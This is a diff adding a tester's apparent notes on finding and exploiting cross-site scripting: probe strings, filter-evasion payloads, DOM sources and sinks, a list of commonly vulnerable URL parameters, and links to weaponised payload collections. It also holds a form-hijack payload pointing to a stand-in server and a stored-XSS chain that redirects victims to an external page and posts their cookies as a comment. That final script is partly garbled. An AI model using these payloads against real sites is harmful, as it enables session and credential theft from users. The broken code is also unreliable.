@@ -1,0 +1,199 @@
+GO SLOW!
+
+Start by testing allowed characters
+"
+">
+"><>
+"><script>
+"></script>
+"><script>alert(1)</script>
+"><script>confirm(1)</script>
+...
+https://owasp.org/www-community/xss-filter-evasion-cheatsheet
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+Test first character that breaks the HTML with test word
+	">qweqwe
+Search for the test word in the response
+	auto-scroll function in search bar
+
+
+
+XSS Polyglots
+	https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
+
+
+Test values:
+	<marquee>
+	`';!--"<XSS>=&{()}
+	<script>alert(document.location)</script>
+	<img src="javascript:alert(document.location);">
+	<body onload=alert(document.location)>
+
+To demonstrate XSS impact, don't use alert('alert'). Determine whether session is stored in cookies or local storage and put that in the popup.
+	cookie: alert(document.cookie)
+	LocalStorage: alert(localStorage.getItem('access_token'))
+Use hookbin or Collaborator extension to collect cookies
+
+Reflected 
+	Test all parameters that might be reflected in response
+
+
+
+
+DOM
+	Sources
+		document.url
+		document.referrer
+		location
+		location.href
+		location.search
+		location.hash
+		location.pathname
+	Sinks
+		element.innerHTML()
+		element.outerHTML()
+		eval()
+		setTimeout()
+		setInterval()
+		document.write()
+		document.writeln()
+
+Self
+	Upgrade impact of stored self-xss
+		Save XSS into attacker account
+		Force victim to log out of their account
+		Force victim to log into attacker account
+			"easy" is loading vulnerable site via iframe or window.open()
+		XSS triggers
+		Check for:
+			cookies or local storage persist after logout 
+			can force victim to log back in using OAuth
+			credentials
+
+			
+
+
+
+App-specific impact demonstration payloads
+	https://github.com/hakluke/weaponised-XSS-payloads
+	https://github.com/hoodoer/WP-XSS-Admin-Funcs
+
+
+If you have a XSS in a <form> tag, close it and open a new form that you are controlling.
+"></form><form action="http://yourserver/>
+
+
+use file:// instead of http:// in parameter - sometimes it will bypass URL restrictions while redirect in page and use this payload to fire xss.
+Payload: file:///</script><script>alert(1)</script> 
+
+
+regex/javascript to prevent XSS is a bad idea:
+<xmp><p title="</xmp><script>alert(0)</script>">
+Script tags not encoded as regex assumes it's in p tag but p isn't a tag - html in xmp tags is text
+
+
+Split your XSS payload into two like:
+FName: <img src=x 
+LName: onerror=prompt(0);> 
+sometimes you will end getting Stored XSS
+
+
+XSS Dorks (top 25 per OpenBugBounty)
+	?q=<payload>
+	?s=
+	?search=
+	?id=
+	?lang=
+	?keyword=
+	?query=
+	?page=
+	?keywords=
+	?year=
+	?view=
+	?email=
+	?type=
+	?name=
+	?p=
+	?month=
+	?immagine=
+	?list_type=
+	?url=
+	?categoryid=
+	?key=
+	?l=
+	?begindate=
+	?enddate=
+
+
+
+
+
+
+
+Example - Steal cookies and post them as post comment using stored XSS
+	Stored comment:
+		<script>window.location.href = "https://drewadwade.github.io/dangerdonotenter/CSRF.html";</script>
+
+	For required CSRF token:
+	-need stored xss to get csrf token and pass as parameter to CSRF.html
+
+	Comment field for autosubmit in CSRF.html:
+		<script>function listCookies() {var theCookies = document.cookie.split(';'); var aString = ''; for (var i = 1 ; i <= theCookies.length; i++) {aString += i + ' ' + theCookies[i-1];} return aString;}document.write(listCookies())</script>
+
+
+	Example - If CSRF is defined before stored script triggers
+		<script>
+		async function autoLogIn() {
+		    var form = document.createElement("form");
+		    var element1 = document.createElement("input"); 
+		    var element2 = document.createElement("input");  
+			var element3 = document.createElement("input"); 
+		    var element4 = document.createElement("input");  
+		    var element5 = document.createElement("input");  
+			var element6 = document.createElement("input");  
+		    
+		    form.method = "POST";
+		    form.action = "/comment";   
+
+(async() => {
+    console.log("waiting for variable");
+    while(!(document.getElementsByName('csrf')[0]).value) 
+        await new Promise(resolve => setTimeout(resolve, 1000));
+    console.log("variable is defined");
+    console.log((document.getElementsByName('csrf')[0]).value)
+})();
+console.log("above code doesn't block main function stack");
+		    element1.value=csrf;
+		    element1.name=await (document.getElementsByName('csrf')[0]).value;
+		    form.appendChild(element1);  
+
+		    element2.value=postId;
+		    element2.name=1;
+		    form.appendChild(element2);
+
+			element3.value=comment;
+		    element3.name="<scr"+"ipt>function listCookies() {var theCookies = document.cookie.split(';'); var aString = ''; for (var i = 1 ; i <= theCookies.length; i++) {aString += i + ' ' + theCookies[i-1];} return aString;}document.write(listCookies())</scr"+"ipt>";
+		    form.appendChild(element3);  
+
+			element4.value=name;
+		    element4.name="test";
+		    form.appendChild(element4);  
+
+			element5.value=email;
+		    element5.name="test@test";
+		    form.appendChild(element5);  
+
+			element6.value=website;
+		    element6.name="http://test";
+		    form.appendChild(element6);  
+		    
+		    document.body.appendChild(form);
+
+		    form.submit();
+		}
+		autoLogIn()
+		</script>
+
+
+
